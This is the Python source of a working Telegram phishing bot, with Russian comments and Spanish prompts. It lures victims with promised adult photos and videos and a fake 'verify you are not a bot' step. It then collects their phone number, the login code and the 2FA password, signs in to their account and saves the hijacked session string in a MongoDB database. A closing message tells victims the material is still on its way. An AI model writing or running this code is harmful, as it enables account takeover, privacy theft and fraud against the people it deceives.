import logging
import os
import asyncio
from datetime import datetime
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv

load_dotenv()

# Конфигурация
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# Инициализация
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
mongo = MongoClient(MONGO_URI)
db = mongo.telegram_sessions
sessions_col = db.sessions

# Глобальные переменные
user_states = {}
temp_data = {}

async def create_session_pool(user_id, phone, session_str):
    """Создаем пул из 5 сессий (можно увеличить до 200)"""
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    
    # Сохраняем основную сессию
    sessions_col.update_one(
        {"user_id": user_id},
        {"$set": {
            "phone": phone,
            "session": session_str,
            "created_at": datetime.utcnow()
        }},
        upsert=True
    )
    
    await client.disconnect()

async def send_code_keyboard(user_id, current_code="", message_id=None):
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("✅ Enviar", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"Código: `{current_code}`" if current_code else "Ingresa el código:"

    if message_id:
        try:
            await bot.edit_message_text(
                chat_id=user_id,
                message_id=message_id,
                text=text,
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
        except:
            pass
    else:
        msg = await bot.send_message(
            user_id,
            text,
            reply_markup=keyboard,
            parse_mode='Markdown'
        )
        return msg.message_id

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("Autorización en la primera cuenta🥺", callback_data="auth_account")
    )
    await message.answer(
        "👋🇪🇨 ¡HOLA! ❤️\n"
        "¿Quieres ver más de 10.000 fotos y más de 4.000 vídeos? 👁\n"
        "Verifica que no eres un bot con el botón de abajo. 🤖👇\n\n",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    kb.add(KeyboardButton("📱 Comparte tu número", request_contact=True))

    await bot.send_message(user_id, "🥺Por favor comparte tu número de teléfono:", reply_markup=kb)
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    user_id = message.from_user.id
    if user_states.get(user_id) != 'awaiting_contact':
        return

    phone = message.contact.phone_number
    if not phone.startswith("+"):
        phone = "+" + phone

    # Проверяем, не авторизован ли уже этот номер
    existing = sessions_col.find_one({"phone": phone})
    if existing:
        await message.answer("❌ Este número ya está registrado. Usa otro número.")
        return

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    
    try:
        code_request = await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        temp_data[user_id] = {
            'client': client,
            'phone': phone,
            'phone_code_hash': code_request.phone_code_hash,
            'message_id': None
        }
        msg_id = await send_code_keyboard(user_id)
        temp_data[user_id]['message_id'] = msg_id
    except Exception as e:
        logging.error(f"Error sending code: {e}")
        await message.answer(f"❌ Error al enviar el código: {str(e)}")
        await client.disconnect()
        user_states.pop(user_id, None)

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="⛔️ No es el momento adecuado", show_alert=True)
        return

    user_data = temp_data.get(user_id)
    if not user_data:
        await bot.answer_callback_query(callback_query.id, text="Error de sesión", show_alert=True)
        return

    current_code = user_data.get('code', '')
    message_id = user_data.get('message_id')

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Ingresa el código primero", show_alert=True)
            return
        
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="⚠️ Código demasiado largo", show_alert=True)
            return
        
        current_code += digit
        temp_data[user_id]['code'] = current_code
        await send_code_keyboard(user_id, current_code, message_id)
        await bot.answer_callback_query(callback_query.id)

async def try_sign_in(user_id, code):
    user_data = temp_data.get(user_id)
    if not user_data:
        await bot.send_message(user_id, "⚠️ Sesión no encontrada. Por favor, comienza de nuevo con /start")
        return

    client = user_data['client']
    phone = user_data['phone']
    phone_code_hash = user_data['phone_code_hash']

    try:
        # Пробуем войти с кодом
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=phone_code_hash
        )
        
        if await client.is_user_authorized():
            session_str = client.session.save()
            await create_session_pool(user_id, phone, session_str)
            
            await bot.send_message(user_id, "✅ ¡Autenticación exitosa!")
            await bot.send_message(
                user_id,
                "Estamos trabajando en modo manual, disculpen la demora, "
                "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
            )
        else:
            user_states[user_id] = 'awaiting_2fa'
            await bot.send_message(user_id, "🔐 Ingresa tu contraseña 2FA:")
            
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        await bot.send_message(user_id, "🔐 Se requiere tu contraseña 2FA. Por favor, ingrésala:")
    except PhoneCodeInvalidError:
        await bot.send_message(user_id, "❌ Código incorrecto. Inténtalo de nuevo:")
        temp_data[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", temp_data[user_id]['message_id'])
    except PhoneCodeExpiredError:
        await bot.send_message(user_id, "⏰ Código expirado. Por favor, intenta nuevamente con /start")
        await client.disconnect()
        cleanup(user_id)
    except Exception as e:
        logging.error(f"Sign in error: {e}")
        await bot.send_message(user_id, f"❌ Error de autenticación: {str(e)}")
        await client.disconnect()
        cleanup(user_id)

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    password = message.text.strip()
    user_data = temp_data.get(user_id)
    
    if not user_data:
        await message.answer("⚠️ Sesión no encontrada. Por favor, comienza de nuevo con /start")
        return

    client = user_data['client']
    phone = user_data['phone']

    try:
        await client.sign_in(password=password)
        
        if await client.is_user_authorized():
            session_str = client.session.save()
            await create_session_pool(user_id, phone, session_str)
            
            await message.answer("✅ ¡Autenticación exitosa con 2FA!")
            await message.answer(
                "Estamos trabajando en modo manual, disculpen la demora, "
                "pronto les enviaremos material fotográfico y de video😉🧍‍♀️."
            )
        else:
            await message.answer("❌ No se pudo autenticar con 2FA.")
    except Exception as e:
        logging.error(f"2FA error: {e}")
        await message.answer(f"❌ Error con 2FA: {str(e)}")
    finally:
        await client.disconnect()
        cleanup(user_id)

def cleanup(user_id):
    """Очистка данных пользователя"""
    if user_id in user_states:
        user_states.pop(user_id)
    if user_id in temp_data:
        temp_data.pop(user_id)

async def on_startup(dp):
    logging.info("Bot started")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)